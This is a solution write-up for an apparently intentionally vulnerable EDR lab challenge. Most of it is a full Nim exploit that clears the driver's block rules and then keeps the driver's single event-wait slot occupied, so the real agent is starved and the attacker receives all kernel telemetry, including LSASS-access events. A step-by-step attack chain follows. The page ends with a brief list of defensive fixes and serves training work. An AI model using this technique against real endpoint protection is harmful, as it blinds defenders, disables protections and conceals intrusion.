---
title: "Solution 42: Event Channel DoS"
difficulty: medium
category: "IOCTL Abuse"
---

[Back to Challenge]({{ '/challenges/42-event-channel-dos/' | relative_url }})

## Overview

The driver's event delivery uses a single `PendingIrp` slot. An attacker who continuously occupies this slot with their own `IOCTL_WAIT_FOR_EVENT` requests starves the legitimate agent — it gets `STATUS_DEVICE_BUSY` on every poll and sees nothing. The agent stays alive but is completely deaf, while the attacker receives all kernel events as a free telemetry wiretap.

## Solution

```nim
# event_dos.nim - monopolize the EDR's event channel
import winim/lean
import os

const
  DEVICE_PATH         = r"\\.\MostShittyEDR"
  IOCTL_WAIT_FOR_EVENT = 0x222000'u32
  IOCTL_CLEAR_RULES    = 0x22200C'u32

  EVENT_PROCESS_CREATE = 1'u32
  EVENT_PROCESS_EXIT   = 2'u32
  EVENT_THREAD_CREATE  = 3'u32
  EVENT_LSASS_ACCESS   = 5'u32

type
  EdrEvent {.packed.} = object
    eventType: uint32
    timestamp: int64
    processId: uint64
    threadId: uint64
    parentProcessId: uint64
    blocked: byte
    imageFileName: array[260, WCHAR]
    commandLine: array[512, WCHAR]

proc wcharToString(arr: openArray[WCHAR]): string =
  result = ""
  for c in arr:
    if c == WCHAR(0): break
    result.add(char(c))

when isMainModule:
  echo "[*] Event Channel DoS — monopolizing the EDR's event pipe"
  echo ""

  # Open the device with overlapped I/O for async event waiting
  let hDevice = CreateFileA(DEVICE_PATH,
    GENERIC_READ or GENERIC_WRITE,
    0, nil, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL or FILE_FLAG_OVERLAPPED, 0)
  if hDevice == INVALID_HANDLE_VALUE:
    echo "[-] Cannot open device"
    quit(1)
  echo "[+] Device opened — agent will get STATUS_DEVICE_BUSY"

  # Clear block rules so nothing is blocked at kernel level
  var br: DWORD
  discard DeviceIoControl(hDevice, IOCTL_CLEAR_RULES,
    nil, 0, nil, 0, &br, nil)
  echo "[+] Block rules cleared"
  echo "[*] Listening for kernel events (agent is blind)..."
  echo ""

  let hEvent = CreateEventA(nil, TRUE, FALSE, nil)
  var eventCount = 0

  # Continuous loop — grab events before the agent can
  while true:
    var ev: EdrEvent
    var overlapped: OVERLAPPED
    overlapped.hEvent = hEvent
    ResetEvent(hEvent)

    let ok = DeviceIoControl(hDevice, IOCTL_WAIT_FOR_EVENT,
      nil, 0, &ev, DWORD(sizeof(ev)), &br, &overlapped)

    if ok == 0 and GetLastError() == ERROR_IO_PENDING:
      # Wait for the next kernel event
      WaitForSingleObject(hEvent, INFINITE)
      discard GetOverlappedResult(hDevice, &overlapped, &br, FALSE)

    if br >= DWORD(sizeof(EdrEvent)):
      inc eventCount
      let img = ev.imageFileName.wcharToString()

      case ev.eventType
      of EVENT_PROCESS_CREATE:
        let cmd = ev.commandLine.wcharToString()
        echo "[STOLEN #", eventCount, "] Process CREATE PID=",
             ev.processId, " PPID=", ev.parentProcessId,
             " Image=", img
        if cmd.len > 0:
          echo "         CmdLine: ", cmd[0 .. min(79, cmd.len-1)]
      of EVENT_PROCESS_EXIT:
        echo "[STOLEN #", eventCount, "] Process EXIT  PID=",
             ev.processId
      of EVENT_THREAD_CREATE:
        echo "[STOLEN #", eventCount, "] Thread+       PID=",
             ev.processId, " TID=", ev.threadId
      of EVENT_LSASS_ACCESS:
        echo "[STOLEN #", eventCount, "] LSASS ACCESS  PID=",
             ev.processId, " BLOCKED=", ev.blocked
      else:
        echo "[STOLEN #", eventCount, "] Event type=",
             ev.eventType, " PID=", ev.processId
```

## Why It Works

The `HandleWaitForEvent` handler ([driver.cpp:689-752](../../src/driver/driver.cpp)) enforces a single-consumer model:

```
if (g_State.PendingIrp != NULL) {
    // Already occupied — reject
    return STATUS_DEVICE_BUSY;
}
```

The flow:
1. Attacker sends `WAIT_FOR_EVENT` → IRP is pended in `g_State.PendingIrp`
2. Agent sends `WAIT_FOR_EVENT` → gets `STATUS_DEVICE_BUSY` (the slot is taken)
3. When a kernel callback fires, `EnqueueEvent` completes the attacker's IRP with the event data
4. The attacker immediately sends another `WAIT_FOR_EVENT` → re-occupies the slot
5. The agent never gets a slot — it's permanently starved

This is a **race-free DoS** because:
- The attacker's IRP completes and gets re-submitted faster than the agent's poll loop
- The agent's `driverWaitForEvent` gets `werBusy` and sleeps 100ms before retrying — the attacker re-occupies the slot during that sleep
- Even without the sleep, the attacker wins because the IRP completion + re-submission path is tighter

**Bonus**: the attacker receives all kernel telemetry — every process creation, thread event, and LSASS access attempt flows to the attacker's tool instead of the EDR agent. This is effectively a free kernel-level wiretap.

A production EDR would fix this with:
- Process binding on `IRP_MJ_CREATE` — only the registered agent PID can send `WAIT_FOR_EVENT`
- Exclusive device open (`IoCreateDevice` with `Exclusive = TRUE`)
- Multiple consumer support (per-client event queues)
- Agent identity verification via digital signature or token

## Attack Chain

```
1. Open \\.\MostShittyEDR with FILE_FLAG_OVERLAPPED
2. IOCTL_CLEAR_BLOCK_RULES — remove kernel protections
3. Loop: IOCTL_WAIT_FOR_EVENT → receive event → repeat
4. Agent gets STATUS_DEVICE_BUSY on every attempt
5. Agent is alive but deaf — all events flow to attacker
6. Attacker has a free kernel telemetry wiretap
```

## How to Verify

1. Start the DoS tool first: `nim c -r event_dos.nim`
2. Start the EDR: `.\edr_agent.exe --driver --verbose`
3. The agent's output shows no `[CREATE]`, `[EXIT]`, or `[THREAD+]` events
4. The DoS tool's output shows `[STOLEN #N]` for every kernel event
5. Launch `notepad.exe` — the DoS tool shows the create event, the agent shows nothing
